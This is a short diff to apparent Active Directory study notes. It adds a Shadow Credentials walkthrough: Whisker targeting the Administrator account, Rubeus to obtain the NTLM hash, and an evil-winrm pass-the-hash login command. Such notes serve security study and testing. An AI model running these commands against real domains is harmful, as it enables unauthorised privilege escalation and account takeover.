@@ -10,3 +10,10 @@ Windows Hello for Business (WHfB) :
              The organisation's certificate issuing authority (CA) receives this request and provides a valid certificate.
           3) The user account's msDS-KeyCredentialLink attribute will be set.
 
+Shadow Credentials attack : compromise an account ( which has the GenericWrite permission over the administrator object visible on the CN attribute ) with that privilege by updating the msDS-KeyCredentialLink with a certificate.
+
+pass-the-hash attack : 
+            .\Whisker.exe add /target:Administrator
+            ==> that gives you a rubeus command to execute :
+            using Rubeus to get the NTLM hash of the impersonated user 
+            evil-winrm -i IP_MACHINE -u Administrator -H NTLM_HASH
